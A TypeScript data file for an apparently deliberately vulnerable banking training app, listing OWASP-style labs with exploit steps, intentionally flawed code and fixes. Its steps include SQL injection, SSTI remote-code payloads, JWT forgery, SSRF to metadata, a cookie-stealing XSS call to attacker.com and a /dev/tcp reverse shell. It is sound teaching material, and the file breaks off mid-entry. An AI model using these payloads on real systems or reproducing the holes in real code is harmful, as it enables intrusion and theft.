import type { LabData } from '../../components/LabPanel'

export const labsData: Record<string, LabData> = {
  // ─── A01: Broken Access Control ───────────────────────────────────────────

  'a01-1': {
    id: 1,
    category: 'A01',
    title: 'IDOR — Account Number Enumeration',
    difficulty: 'Low',
    objective:
      'Access another customer\'s account details by manipulating the account ID in the URL. No server-side ownership check is performed.',
    exploitSteps: [
      'Log in as alice (password: password123) and note your account ID in the dashboard URL.',
      'Visit /banking/accounts/1 to see your own account.',
      'Change the ID to /banking/accounts/2 in the browser address bar.',
      'Observe that the server returns bob\'s account balance and transactions without any 403 error.',
      'Enumerate other IDs:\n```bash\nfor i in $(seq 1 20); do\n  curl -s -H "Authorization: Bearer $TOKEN" \\\n    http://localhost:5000/accounts/$i \\\n    | python3 -m json.tool\ndone\n```',
    ],
    affectedCode: [
      {
        filename: 'flask-app/routes/accounts.py',
        language: 'python',
        code: `@app.route('/accounts/<int:account_id>', methods=['GET'])
@jwt_required()
def get_account(account_id):
    # BUG: No check that account_id belongs to current_user
    account = Account.query.get_or_404(account_id)
    return jsonify({
        'id': account.id,
        'account_number': account.account_number,
        'balance': str(account.balance),
        'owner': account.user.username
    })`,
      },
    ],
    hint: 'The route is JWT-protected, so you must be authenticated — but authentication is not authorisation. The server never checks whether the requested account belongs to the token\'s subject. Try incrementing the integer ID in the URL.',
    fix: {
      description: 'Add an ownership check immediately after fetching the resource. Return 403 Forbidden if the authenticated user does not own the requested account.',
      language: 'python',
      before: `account = Account.query.get_or_404(account_id)
return jsonify(account.to_dict())`,
      after: `account = Account.query.get_or_404(account_id)
current_uid = get_jwt_identity()
if account.user_id != current_uid:
    abort(403, description="Access denied")
return jsonify(account.to_dict())`,
    },
    tags: ['IDOR', 'Flask', 'JWT', 'REST'],
  },

  'a01-2': {
    id: 2,
    category: 'A01',
    title: 'Privilege Escalation — Admin Endpoint Exposure',
    difficulty: 'Medium',
    objective:
      'Access the admin user-listing endpoint as a regular user by supplying a valid JWT that lacks the admin role.',
    exploitSteps: [
      'Log in as alice and copy the JWT from localStorage.',
      'Decode the JWT header+payload at jwt.io — observe role is "user".',
      'Send a request directly to the admin endpoint:\n```bash\ncurl -H "Authorization: Bearer $TOKEN" \\\n  http://localhost:5000/admin/users\n```',
      'The server returns all users because it only checks for JWT presence, not the role claim.',
      'Try listing and modifying users:\n```bash\ncurl -X POST -H "Authorization: Bearer $TOKEN" \\\n  -H "Content-Type: application/json" \\\n  -d \'{"username":"eve","role":"admin"}\' \\\n  http://localhost:5000/admin/users\n```',
    ],
    affectedCode: [
      {
        filename: 'flask-app/routes/admin.py',
        language: 'python',
        code: `@app.route('/admin/users', methods=['GET'])
@jwt_required()           # only checks token is present
def list_users():
    # BUG: Never checks if user has admin role
    users = User.query.all()
    return jsonify([u.to_dict() for u in users])`,
      },
    ],
    hint: 'The @jwt_required() decorator only verifies the token signature and expiry. It says nothing about what the token\'s subject is allowed to do. Look at the JWT payload claims and think about what extra check is missing.',
    fix: {
      description: 'Create a @admin_required decorator that extracts the role claim from the JWT and aborts with 403 if the value is not "admin".',
      language: 'python',
      before: `@app.route('/admin/users', methods=['GET'])
@jwt_required()
def list_users():
    users = User.query.all()
    return jsonify([u.to_dict() for u in users])`,
      after: `def admin_required(fn):
    @wraps(fn)
    @jwt_required()
    def wrapper(*args, **kwargs):
        claims = get_jwt()
        if claims.get('role') != 'admin':
            abort(403, description="Admin access required")
        return fn(*args, **kwargs)
    return wrapper

@app.route('/admin/users', methods=['GET'])
@admin_required
def list_users():
    users = User.query.all()
    return jsonify([u.to_dict() for u in users])`,
    },
    tags: ['PrivEsc', 'Flask', 'JWT', 'RBAC'],
  },

  'a01-3': {
    id: 3,
    category: 'A01',
    title: 'SSRF — Unvalidated Callback URL',
    difficulty: 'High',
    objective:
      'Force the server to make HTTP requests to internal services by supplying a crafted callback URL in a payment webhook.',
    exploitSteps: [
      'Find the payment callback endpoint from the API docs at /api-docs.',
      'Register a webhook pointing at an internal service:\n```bash\ncurl -X POST http://localhost:5000/payments/webhook-register \\\n  -H "Authorization: Bearer $TOKEN" \\\n  -H "Content-Type: application/json" \\\n  -d \'{"callback_url": "http://169.254.169.254/latest/meta-data/"}\'\n```',
      'Trigger a payment event to cause the server to fetch the URL:\n```bash\ncurl -X POST http://localhost:5000/payments/trigger \\\n  -H "Authorization: Bearer $TOKEN" \\\n  -d \'{"payment_id": 1}\'\n```',
      'Observe the metadata response echoed back in the webhook result.',
      'Probe internal services:\n```bash\n# Try hitting internal Redis\ncurl ... -d \'{"callback_url": "http://localhost:6379/"}\'\n# Try internal Django admin\ncurl ... -d \'{"callback_url": "http://django-app:8000/admin/"}\'\n```',
    ],
    affectedCode: [
      {
        filename: 'flask-app/routes/payments.py',
        language: 'python',
        code: `@app.route('/payments/webhook-register', methods=['POST'])
@jwt_required()
def register_webhook():
    data = request.get_json()
    callback_url = data.get('callback_url')
    # BUG: No URL validation — attacker can supply internal addresses
    db.session.add(Webhook(url=callback_url, user_id=get_jwt_identity()))
    db.session.commit()
    return jsonify({'status': 'registered'})

def fire_webhook(payment_id):
    webhook = Webhook.query.filter_by(payment_id=payment_id).first()
    if webhook:
        requests.get(webhook.url, timeout=5)   # BUG: unconstrained fetch`,
      },
    ],
    hint: 'The server fetches whatever URL the client supplies. Think about what network the server lives on inside Docker Compose. Can you reach other containers, cloud metadata endpoints, or localhost services?',
    fix: {
      description: 'Validate callback URLs against an explicit allowlist of approved domains before storing or fetching them.',
      language: 'python',
      before: `def fire_webhook(url):
    requests.get(url, timeout=5)`,
      after: `ALLOWED_HOSTS = {'payment-partner.example.com', 'notify.example.com'}

def fire_webhook(url):
    parsed = urllib.parse.urlparse(url)
    if parsed.scheme not in ('http', 'https'):
        raise ValueError("Invalid scheme")
    if parsed.hostname not in ALLOWED_HOSTS:
        raise ValueError(f"Host {parsed.hostname!r} is not allowed")
    requests.get(url, timeout=5, allow_redirects=False)`,
    },
    tags: ['SSRF', 'Flask', 'Network', 'Webhook'],
  },

  // ─── A02: Security Misconfiguration ───────────────────────────────────────

  'a02-4': {
    id: 4,
    category: 'A02',
    title: 'Debug Mode Enabled in Production',
    difficulty: 'Low',
    objective:
      'Trigger an unhandled exception and harvest stack-trace information from the interactive debugger page exposed by DEBUG=True.',
    exploitSteps: [
      'Browse to an endpoint that is known to crash:\n```bash\ncurl http://localhost:8000/api/accounts/abc\n```',
      'Observe the full Django debug page with settings, source code snippets, and local variables.',
      'Craft an error on a sensitive path:\n```bash\ncurl "http://localhost:8000/api/transfers/?amount=NOTANUMBER"\n```',
      'Read SECRET_KEY and DATABASE_URL from the debug settings table.',
      'If the Werkzeug debugger pin is reachable, execute arbitrary Python:\n```bash\ncurl http://localhost:5000/__debugger__/console?frm=0\n```',
    ],
    affectedCode: [
      {
        filename: 'django-app/securebank/settings.py',
        language: 'python',
        code: `# BUG: DEBUG must never be True in production
DEBUG = True

ALLOWED_HOSTS = ['*']

DATABASES = {
    'default': {
        'ENGINE': 'django.db.backends.postgresql',
        'NAME': os.environ.get('DB_NAME', 'securebank'),
        'USER': os.environ.get('DB_USER', 'postgres'),
        'PASSWORD': os.environ.get('DB_PASSWORD', 'postgres'),
        'HOST': 'db',
    }
}`,
      },
    ],
    hint: 'With DEBUG=True, Django renders a detailed error page containing local variable values, full stack traces, and the contents of settings.py (with passwords partially masked). Check whether the Werkzeug interactive debugger exposes a console.',
    fix: {
      description: 'Set DEBUG=False, restrict ALLOWED_HOSTS, and configure a proper error logging backend so crashes are logged server-side without exposing details to clients.',
      language: 'python',
      before: `DEBUG = True
ALLOWED_HOSTS = ['*']`,
      after: `DEBUG = False
ALLOWED_HOSTS = os.environ.get('ALLOWED_HOSTS', 'localhost').split(',')

LOGGING = {
    'version': 1,
    'handlers': {
        'file': {
            'class': 'logging.FileHandler',
            'filename': '/var/log/django/error.log',
        },
    },
    'root': {'handlers': ['file'], 'level': 'ERROR'},
}`,
    },
    tags: ['Debug', 'Django', 'Config', 'StackTrace'],
  },

  'a02-5': {
    id: 5,
    category: 'A02',
    title: 'Default Admin Credentials',
    difficulty: 'Low',
    objective:
      'Log in to the Django admin panel using the default superuser credentials (admin/admin) that were set during initial setup.',
    exploitSteps: [
      'Navigate to http://localhost:8000/admin/',
      'Enter username: admin, password: admin.',
      'Observe full Django admin access — users, groups, all model data.',
      'Confirm credentials in the provisioning script:\n```bash\ngrep -r "createsuperuser" ./django-app/\n```',
      'Create a new superuser account as a backdoor:\n```bash\ncurl -X POST http://localhost:8000/admin/auth/user/add/ \\\n  --cookie "sessionid=$SID;csrftoken=$CSRF" \\\n  -d "username=evil&password1=Passw0rd!&password2=Passw0rd!&is_superuser=on"\n```',
    ],
    affectedCode: [
      {
        filename: 'django-app/entrypoint.sh',
        language: 'bash',
        code: `#!/bin/sh
python manage.py migrate

# BUG: Hardcoded default superuser credentials
echo "from django.contrib.auth import get_user_model; \\
User = get_user_model(); \\
User.objects.filter(username='admin').exists() or \\
User.objects.create_superuser('admin', 'admin@bank.local', 'admin')" \\
| python manage.py shell

python manage.py runserver 0.0.0.0:8000`,
      },
    ],
    hint: 'Many training and demo setups create an admin account with password "admin" for convenience and forget to change it. Check /admin/ and also try the Flask API with common credential pairs.',
    fix: {
      description: 'Never hardcode credentials. Read the initial superuser password from an environment variable set at deploy time and document the rotation procedure.',
      language: 'bash',
      before: `User.objects.create_superuser('admin', 'admin@bank.local', 'admin')`,
      after: `import os
admin_pass = os.environ.get('DJANGO_SUPERUSER_PASSWORD')
if not admin_pass:
    raise RuntimeError("DJANGO_SUPERUSER_PASSWORD env var is required")
User.objects.create_superuser(
    os.environ['DJANGO_SUPERUSER_USER'],
    os.environ['DJANGO_SUPERUSER_EMAIL'],
    admin_pass
)`,
    },
    tags: ['DefaultCreds', 'Django', 'Admin', 'Config'],
  },

  'a02-6': {
    id: 6,
    category: 'A02',
    title: 'Static Files Expose .env',
    difficulty: 'Medium',
    objective:
      'Retrieve the application .env file (containing database passwords and secret keys) through the misconfigured static file server.',
    exploitSteps: [
      'Identify the static files root by inspecting HTML source for asset URLs.',
      'Traverse up from the static path:\n```bash\ncurl http://localhost:8000/static/../.env\n```',
      'Or request directly if STATIC_ROOT is the project root:\n```bash\ncurl http://localhost:8000/static/.env\n```',
      'Read all secrets:\n```bash\ncurl http://localhost:8000/static/securebank/settings.py\ncurl http://localhost:8000/static/requirements.txt\n```',
      'Use harvested DATABASE_URL to connect directly:\n```bash\npsql "$DATABASE_URL" -c "SELECT username, password FROM users;"\n```',
    ],
    affectedCode: [
      {
        filename: 'django-app/securebank/settings.py',
        language: 'python',
        code: `# BUG: STATIC_ROOT points to project root, exposing all files
BASE_DIR = Path(__file__).resolve().parent.parent
STATIC_ROOT = BASE_DIR   # serves everything under project root
STATIC_URL = '/static/'

# .env lives at BASE_DIR/.env — now publicly readable`,
      },
    ],
    hint: 'STATIC_ROOT tells collectstatic where to gather files, and the web server serves that directory. If it points to the project root, every file in the project (including .env) is reachable via /static/.',
    fix: {
      description: 'Set STATIC_ROOT to a dedicated directory outside the project source tree and ensure the web server only serves that directory.',
      language: 'python',
      before: `STATIC_ROOT = BASE_DIR`,
      after: `STATIC_ROOT = BASE_DIR / 'staticfiles'   # isolated directory
# Never commit .env; use docker secrets or env vars
# Confirm .gitignore includes .env and staticfiles/`,
    },
    tags: ['FileExposure', 'Django', 'StaticFiles', 'Config'],
  },

  // ─── A04: Cryptographic Failures ──────────────────────────────────────────

  'a04-7': {
    id: 7,
    category: 'A04',
    title: 'Weak Password Hashing — MD5',
    difficulty: 'Low',
    objective:
      'Crack a password hash stored in the database using a rainbow table attack, exploiting the insecure MD5 hashing algorithm.',
    exploitSteps: [
      'Obtain a password hash from the database (via SQLi or admin panel):\n```bash\npsql "$DB_URL" -c "SELECT username, password FROM users LIMIT 5;"\n```',
      'The hash looks like: 482c811da5d5b4bc6d497ffa98491e38',
      'Look it up in a public rainbow table:\n```bash\ncurl "https://md5.gromweb.com/?md5=482c811da5d5b4bc6d497ffa98491e38"\n# Returns: password123\n```',
      'Or crack offline with hashcat:\n```bash\nhashcat -m 0 hashes.txt rockyou.txt\n```',
      'Log in with the recovered plaintext password.',
    ],
    affectedCode: [
      {
        filename: 'flask-app/models/user.py',
        language: 'python',
        code: `import hashlib

class User(db.Model):
    username = db.Column(db.String(80), unique=True)
    password = db.Column(db.String(32))   # MD5 hex = 32 chars

    def set_password(self, plaintext):
        # BUG: MD5 is a fast, broken hash — not a password KDF
        self.password = hashlib.md5(plaintext.encode()).hexdigest()

    def check_password(self, plaintext):
        return self.password == hashlib.md5(plaintext.encode()).hexdigest()`,
      },
    ],
    hint: 'MD5 produces a 128-bit digest in nanoseconds. Modern GPUs can test billions of MD5 hashes per second. Common passwords appear verbatim in pre-computed rainbow tables. A proper password KDF (bcrypt, Argon2, scrypt) is designed to be slow.',
    fix: {
      description: 'Replace MD5 with bcrypt. bcrypt incorporates a per-user salt automatically and has a configurable work factor that makes brute-force computationally expensive.',
      language: 'python',
      before: `import hashlib

def set_password(self, plaintext):
    self.password = hashlib.md5(plaintext.encode()).hexdigest()`,
      after: `import bcrypt

def set_password(self, plaintext):
    salt = bcrypt.gensalt(rounds=12)
    self.password = bcrypt.hashpw(plaintext.encode(), salt).decode()

def check_password(self, plaintext):
    return bcrypt.checkpw(plaintext.encode(), self.password.encode())`,
    },
    tags: ['MD5', 'Hashing', 'Flask', 'Password'],
  },

  'a04-8': {
    id: 8,
    category: 'A04',
    title: 'Hardcoded JWT Secret',
    difficulty: 'Medium',
    objective:
      'Forge a JWT with an elevated role claim by discovering the hardcoded secret key in the source code.',
    exploitSteps: [
      'Find the secret key in the repository:\n```bash\ngrep -r "SECRET_KEY" ./flask-app/\n# Output: SECRET_KEY = "secret"\n```',
      'Decode an existing JWT to inspect its structure:\n```bash\necho $TOKEN | cut -d. -f2 | base64 -d 2>/dev/null | python3 -m json.tool\n```',
      'Forge a token with admin role using the known secret:\n```bash\npython3 - <<\'EOF\'\nimport jwt, time\npayload = {"sub": 1, "role": "admin", "exp": int(time.time()) + 3600}\ntoken = jwt.encode(payload, "secret", algorithm="HS256")\nprint(token)\nEOF\n```',
      'Use the forged token to access admin endpoints:\n```bash\ncurl -H "Authorization: Bearer $FORGED_TOKEN" \\\n  http://localhost:5000/admin/users\n```',
    ],
    affectedCode: [
      {
        filename: 'flask-app/config.py',
        language: 'python',
        code: `# BUG: Hardcoded secret key committed to version control
class Config:
    SECRET_KEY = "secret"
    JWT_SECRET_KEY = "secret"
    JWT_ACCESS_TOKEN_EXPIRES = timedelta(hours=24)`,
      },
    ],
    hint: 'If the JWT signing secret is predictable or appears in the codebase, any party that knows it can generate valid tokens for any user with any claims. Check git history too — once committed, secrets live forever unless rotated.',
    fix: {
      description: 'Read the secret from an environment variable. Use secrets.token_hex(32) to generate a 256-bit random value at deploy time and store it in a secrets manager.',
      language: 'python',
      before: `JWT_SECRET_KEY = "secret"`,
      after: `import os, secrets

# Generate once: python3 -c "import secrets; print(secrets.token_hex(32))"
# Store in .env / vault, never in code
JWT_SECRET_KEY = os.environ.get('JWT_SECRET_KEY')
if not JWT_SECRET_KEY:
    raise RuntimeError("JWT_SECRET_KEY env var must be set")`,
    },
    tags: ['JWT', 'HardcodedSecret', 'Flask', 'Config'],
  },

  'a04-9': {
    id: 9,
    category: 'A04',
    title: 'Cleartext PII in API Response and Logs',
    difficulty: 'Low',
    objective:
      'Observe that the API returns and logs full account numbers and national IDs in plaintext, violating data-minimisation principles.',
    exploitSteps: [
      'Fetch any account:\n```bash\ncurl -H "Authorization: Bearer $TOKEN" \\\n  http://localhost:5000/accounts/1\n```',
      'Response includes full account number: "account_number": "GB29NWBK60161331926819"',
      'Check the application log file:\n```bash\ndocker logs flask-app 2>&1 | grep "account_number"\n```',
      'Find that every request logs the full PAN and national ID.',
      'If database access is obtained (via other labs), verify columns are stored unencrypted:\n```bash\npsql "$DB_URL" -c "SELECT account_number, national_id FROM accounts LIMIT 5;"\n```',
    ],
    affectedCode: [
      {
        filename: 'flask-app/routes/accounts.py',
        language: 'python',
        code: `@app.route('/accounts/<int:account_id>', methods=['GET'])
@jwt_required()
def get_account(account_id):
    account = Account.query.get_or_404(account_id)
    # BUG: Returns and logs full PII
    app.logger.info(f"Account access: {account.account_number}, NID: {account.national_id}")
    return jsonify({
        'account_number': account.account_number,  # full IBAN
        'national_id': account.national_id,         # full government ID
        'balance': str(account.balance),
    })`,
      },
    ],
    hint: 'PII should be masked in API responses (show only last 4 digits) and must never appear in log files. Sensitive fields at rest should use column-level encryption.',
    fix: {
      description: 'Mask PII in responses and logs. Encrypt sensitive columns at rest using a field-level encryption library.',
      language: 'python',
      before: `app.logger.info(f"Account access: {account.account_number}")
return jsonify({'account_number': account.account_number, 'national_id': account.national_id})`,
      after: `def mask(value: str, visible: int = 4) -> str:
    return '*' * (len(value) - visible) + value[-visible:]

app.logger.info(f"Account access: account_id={account_id}")  # no PII in logs
return jsonify({
    'account_number': mask(account.account_number),  # e.g. "**********6819"
    'balance': str(account.balance),
    # national_id omitted entirely from response
})`,
    },
    tags: ['PII', 'Logging', 'Flask', 'DataMinimisation'],
  },

  // ─── A05: Injection ───────────────────────────────────────────────────────

  'a05-10': {
    id: 10,
    category: 'A05',
    title: 'SQL Injection — Login Bypass',
    difficulty: 'Low',
    objective:
      'Bypass authentication by injecting SQL into the username field, then dump the users table.',
    exploitSteps: [
      "Attempt login bypass with a classic payload:\n```bash\ncurl -X POST http://localhost:5000/auth/login \\\n  -H 'Content-Type: application/json' \\\n  -d '{\"username\": \"\\' OR 1=1 --\", \"password\": \"anything\"}'\n```",
      'Observe a successful login response with an admin JWT.',
      'Dump the users table with UNION injection:\n```bash\ncurl -X POST http://localhost:5000/auth/login \\\n  -d \'{"username": "\' UNION SELECT username,password,3,4 FROM users--", "password": "x"}\'\n```',
      'Use sqlmap for automated extraction:\n```bash\nsqlmap -u http://localhost:5000/auth/login \\\n  --data \'{"username":"*","password":"x"}\' \\\n  --dbms=postgresql --dump\n```',
    ],
    affectedCode: [
      {
        filename: 'flask-app/routes/auth.py',
        language: 'python',
        code: `@app.route('/auth/login', methods=['POST'])
def login():
    data = request.get_json()
    username = data.get('username')
    password = data.get('password')

    # BUG: String interpolation in SQL query
    query = f"SELECT * FROM users WHERE username='{username}' AND password='{md5(password)}'"
    result = db.engine.execute(query)
    user = result.fetchone()
    if user:
        return jsonify({'token': create_access_token(identity=user['id'])})
    return jsonify({'error': 'Invalid credentials'}), 401`,
      },
    ],
    hint: "Any string that contains a single quote in the username field terminates the SQL string literal early. The `--` sequence starts a comment that ignores the rest of the query, including the password check. Use parameterized queries to separate code from data.",
    fix: {
      description: 'Use parameterised queries (or an ORM). Never interpolate user input into SQL strings.',
      language: 'python',
      before: `query = f"SELECT * FROM users WHERE username='{username}'"
db.engine.execute(query)`,
      after: `# ORM approach (SQLAlchemy)
user = User.query.filter_by(username=username).first()
if user and user.check_password(password):
    return jsonify({'token': create_access_token(identity=user.id)})

# Raw SQL with parameters
result = db.engine.execute(
    "SELECT * FROM users WHERE username = :u",
    {"u": username}
)`,
    },
    tags: ['SQLi', 'Flask', 'Auth', 'PostgreSQL'],
  },

  'a05-11': {
    id: 11,
    category: 'A05',
    title: 'SSTI — Jinja2 Template Injection',
    difficulty: 'Medium',
    objective:
      'Execute server-side code by injecting Jinja2 template expressions into a transaction remark that is rendered with render_template_string.',
    exploitSteps: [
      'Create a transfer with a Jinja2 expression as the note:\n```bash\ncurl -X POST http://localhost:5000/transfers/send \\\n  -H "Authorization: Bearer $TOKEN" \\\n  -H "Content-Type: application/json" \\\n  -d \'{"to": 2, "amount": 1, "note": "{{7*7}}"}\'\n```',
      'Retrieve transactions and observe "49" rendered in the note field — the expression was evaluated.',
      'Escalate to config dump:\n```bash\n-d \'{"note": "{{config}}"}\'\n```',
      'Achieve RCE via class traversal:\n```bash\n-d \'{"note": "{{().__class__.__mro__[1].__subclasses__()[396](\\\"id\\\",shell=True,stdout=-1).communicate()[0].decode()}}"}\'\n```',
    ],
    affectedCode: [
      {
        filename: 'flask-app/routes/transfers.py',
        language: 'python',
        code: `@app.route('/transfers/send', methods=['POST'])
@jwt_required()
def send_transfer():
    data = request.get_json()
    note = data.get('note', '')

    # BUG: User input interpolated directly into a template string
    rendered_note = render_template_string(f"<p>{note}</p>")

    txn = Transaction(note=rendered_note, ...)
    db.session.add(txn)
    db.session.commit()
    return jsonify({'status': 'ok'})`,
      },
    ],
    hint: 'render_template_string evaluates Jinja2 {{ }} expressions. If user input is embedded in the template source (not passed as a variable), the user controls what the template engine executes, including Python class traversal to reach subprocess.',
    fix: {
      description: 'Pass user input as a template variable, never as part of the template source string. Jinja2 auto-escapes variables passed this way.',
      language: 'python',
      before: `rendered_note = render_template_string(f"<p>{note}</p>")`,
      after: `# User input is a VARIABLE, not part of the template source
rendered_note = render_template_string(
    "<p>{{ note }}</p>",
    note=note          # Jinja2 auto-escapes this
)`,
    },
    tags: ['SSTI', 'Jinja2', 'Flask', 'RCE'],
  },

  'a05-12': {
    id: 12,
    category: 'A05',
    title: 'SSTI + Command Injection — Go Template + Shell',
    difficulty: 'High',
    objective:
      'Inject a Go template expression into a date-formatting endpoint, then escalate to OS command injection via unsanitised shell argument construction.',
    exploitSteps: [
      'Find the date formatter endpoint:\n```bash\ncurl "http://localhost:8080/reports/format-date?date=2024-01-01"\n```',
      'Inject a Go template expression:\n```bash\ncurl "http://localhost:8080/reports/format-date?date={{.Env}}"\n```',
      'Observe environment variables returned including DB credentials.',
      'Exploit the shell injection in the date command:\n```bash\ncurl "http://localhost:8080/reports/format-date?date=2024-01-01;id"\n```',
      'Get a reverse shell:\n```bash\ncurl "http://localhost:8080/reports/format-date?date=2024-01-01;bash+-i+>%26+/dev/tcp/10.0.0.1/4444+0>%261"\n```',
    ],
    affectedCode: [
      {
        filename: 'go-report-svc/handlers/date.go',
        language: 'go',
        code: `func FormatDate(w http.ResponseWriter, r *http.Request) {
    dateStr := r.URL.Query().Get("date")

    // BUG 1: text/template evaluates {{.Env}} etc.
    tmpl, _ := template.New("d").Parse(dateStr)
    var buf bytes.Buffer
    tmpl.Execute(&buf, templateData{Env: os.Environ()})

    // BUG 2: Shell injection — unsanitised input in shell command
    out, _ := exec.Command("sh", "-c", "date -d '" + dateStr + "'").Output()
    w.Write(out)
}`,
      },
    ],
    hint: 'Go\'s text/template evaluates actions like {{.Env}} against the data object. Combined with shell command construction via string concatenation, a date value like "2024-01-01\' ; id #" closes the quote, appends a command, and comments out the rest.',
    fix: {
      description: 'Use html/template (auto-escaping) for rendering, and validate the date input strictly against a whitelist pattern before passing to any external command. Prefer Go\'s time.Parse over shelling out to date.',
      language: 'go',
      before: `tmpl, _ := template.New("d").Parse(dateStr)
out, _ := exec.Command("sh", "-c", "date -d '" + dateStr + "'").Output()`,
      after: `import (
    "html/template"
    "regexp"
    "time"
)

var datePattern = regexp.MustCompile(`+"`"+`^\d{4}-\d{2}-\d{2}$`+"`"+`)

func FormatDate(w http.ResponseWriter, r *http.Request) {
    dateStr := r.URL.Query().Get("date")
    if !datePattern.MatchString(dateStr) {
        http.Error(w, "Invalid date format", http.StatusBadRequest)
        return
    }
    t, err := time.Parse("2006-01-02", dateStr)
    if err != nil {
        http.Error(w, "Invalid date", http.StatusBadRequest)
        return
    }
    // No shell, no template injection
    w.Write([]byte(t.Format("January 2, 2006")))
}`,
    },
    tags: ['SSTI', 'GoTemplate', 'CmdInjection', 'RCE'],
  },

  'a05-13': {
    id: 13,
    category: 'A05',
    title: 'Stored XSS — Transaction Note',
    difficulty: 'Low',
    objective:
      'Inject a persistent XSS payload into a transaction note and trigger it in another user\'s browser session.',
    exploitSteps: [
      'Create a transfer with an XSS payload in the note:\n```bash\ncurl -X POST http://localhost:5000/transfers/send \\\n  -H "Authorization: Bearer $TOKEN" \\\n  -H "Content-Type: application/json" \\\n  -d \'{"to": 2, "amount": 1, "note": "<img src=x onerror=fetch(`http://attacker.com/?c=`+document.cookie)>"}\'\n```',
      'Log in as the recipient and navigate to /banking/transfers.',
      'The injected script executes and exfiltrates the session cookie.',
      'More destructive payload — redirect to phishing page:\n```bash\n-d \'{"note": "<script>window.location=\\\"http://evil.com/phish\\\"</script>"}\'\n```',
      'Check the note is stored unescaped in the database:\n```bash\npsql "$DB_URL" -c "SELECT note FROM transactions ORDER BY id DESC LIMIT 5;"\n```',
    ],
    affectedCode: [
      {
        filename: 'frontend/src/pages/banking/TransfersPage.tsx',
        language: 'tsx',
        code: `{transactions.map((txn) => (
  <tr key={txn.id}>
    <td>{txn.date}</td>
    <td>{txn.amount}</td>
    {/* BUG: Renders raw HTML from database without sanitisation */}
    <td dangerouslySetInnerHTML={{ __html: txn.note }} />
  </tr>
))}`,
      },
    ],
    hint: 'dangerouslySetInnerHTML bypasses React\'s default escaping and renders raw HTML. Any note stored in the database is executed as markup in every viewer\'s browser. Even without script tags, event handlers on innocuous elements like <img onerror=...> will execute.',
    fix: {
      description: 'Sanitise HTML with DOMPurify before passing to dangerouslySetInnerHTML. Alternatively, treat notes as plain text and render them with {txn.note} (React-escaped).',
      language: 'tsx',
      before: `<td dangerouslySetInnerHTML={{ __html: txn.note }} />`,
      after: `import DOMPurify from 'dompurify'

// Option A: sanitise and render HTML (allow formatting but block scripts)
<td dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(txn.note) }} />

// Option B (preferred for plain text notes): let React escape it
<td>{txn.note}</td>`,
    },
    tags: ['XSS', 'StoredXSS', 'React', 'DOMPurify'],
  },

  // ─── A06: Insecure Design ─────────────────────────────────────────────────

  'a06-14': {
    id: 14,
    category: 'A06',
    title: 'Negative Transfer Amount',
    difficulty: 'Low',
    objective:
      'Transfer a negative amount to increase your own balance at the expense of another account.',
    exploitSteps: [
      'Note your current balance from the dashboard.',
      'Submit a transfer with a negative amount:\n```bash\ncurl -X POST http://localhost:5000/transfers/send \\\n  -H "Authorization: Bearer $TOKEN" \\\n  -H "Content-Type: application/json" \\\n  -d \'{"from_account_id": 2, "to_account_id": 1, "amount": -500}\'\n```',
      'Observe your balance has increased by 500 and the target\'s decreased.',
      'Repeat to drain any account.',
      'Also try fractional amounts beyond decimal scale to trigger precision errors:\n```bash\n-d \'{"amount": 0.000000001}\'\n```',
    ],
    affectedCode: [
      {
        filename: 'flask-app/routes/transfers.py',
        language: 'python',
        code: `@app.route('/transfers/send', methods=['POST'])
@jwt_required()
def send_transfer():
    data = request.get_json()
    amount = Decimal(data['amount'])   # BUG: No positivity check

    sender.balance -= amount    # negative amount INCREASES sender balance
    recipient.balance += amount # and DECREASES recipient balance
    db.session.commit()
    return jsonify({'status': 'ok'})`,
      },
    ],
    hint: 'The server converts the amount to a Decimal but never checks whether it is positive. A negative value flips the direction of the transfer. Business-logic validation must happen server-side regardless of frontend constraints.',
    fix: {
      description: 'Validate that amount is positive and within reasonable bounds on the server side. Frontend validation is not a security control.',
      language: 'python',
      before: `amount = Decimal(data['amount'])`,
      after: `amount = Decimal(str(data['amount']))
if amount <= 0:
    abort(400, description="Amount must be positive")
if amount > Decimal('50000'):
    abort(400, description="Amount exceeds single-transfer limit")
if amount != round(amount, 2):
    abort(400, description="Amount must have at most 2 decimal places")`,
    },
    tags: ['BusinessLogic', 'Flask', 'Transfer', 'Validation'],
  },

  'a06-15': {
    id: 15,
    category: 'A06',
    title: 'Mass Assignment — Role Escalation',
    difficulty: 'Medium',
    objective:
      'Escalate your account role to "admin" by including a role field in a profile-update request that the DRF serializer applies wholesale.',
    exploitSteps: [
      'Check your current profile:\n```bash\ncurl -H "Authorization: Bearer $TOKEN" http://localhost:8000/api/profile/\n```',
      'Update your profile including a role field:\n```bash\ncurl -X PATCH http://localhost:8000/api/profile/ \\\n  -H "Authorization: Bearer $TOKEN" \\\n  -H "Content-Type: application/json" \\\n  -d \'{"display_name": "Alice", "role": "admin"}\'\n```',
      'Verify your profile now shows role: admin.',
      'Access admin-only endpoints:\n```bash\ncurl -H "Authorization: Bearer $TOKEN" http://localhost:8000/api/admin/users/\n```',
    ],
    affectedCode: [
      {
        filename: 'django-app/api/serializers.py',
        language: 'python',
        code: `class UserProfileSerializer(serializers.ModelSerializer):
    class Meta:
        model = UserProfile
        # BUG: fields = '__all__' includes role, is_staff, is_superuser
        fields = '__all__'

class ProfileUpdateView(generics.UpdateAPIView):
    serializer_class = UserProfileSerializer
    permission_classes = [IsAuthenticated]

    def get_object(self):
        return self.request.user.profile

    def perform_update(self, serializer):
        serializer.save()   # BUG: saves all submitted fields, including role`,
      },
    ],
    hint: 'Django REST Framework\'s ModelSerializer with fields = \'__all__\' will deserialise and write every field in the POST body, including sensitive fields like role or is_superuser. Use an explicit allowlist or read_only_fields.',
    fix: {
      description: 'Enumerate writable fields explicitly. Mark sensitive fields like role, is_staff, and is_superuser as read_only.',
      language: 'python',
      before: `class Meta:
    model = UserProfile
    fields = '__all__'`,
      after: `class Meta:
    model = UserProfile
    fields = ['display_name', 'email', 'phone', 'role', 'is_staff']
    read_only_fields = ['role', 'is_staff', 'is_superuser', 'date_joined']`,
    },
    tags: ['MassAssignment', 'DRF', 'Django', 'PrivEsc'],
  },

  'a06-16': {
    id: 16,
    category: 'A06',
    title: 'User Enumeration via Login Errors',
    difficulty: 'Low',
    objective:
      'Enumerate valid usernames by observing different error messages returned for "user not found" versus "wrong password".',
    exploitSteps: [
      'Try a non-existent user:\n```bash\ncurl -X POST http://localhost:5000/auth/login \\\n  -d \'{"username": "nonexistent", "password": "anything"}\'\n# Response: {"error": "User not found"}\n```',
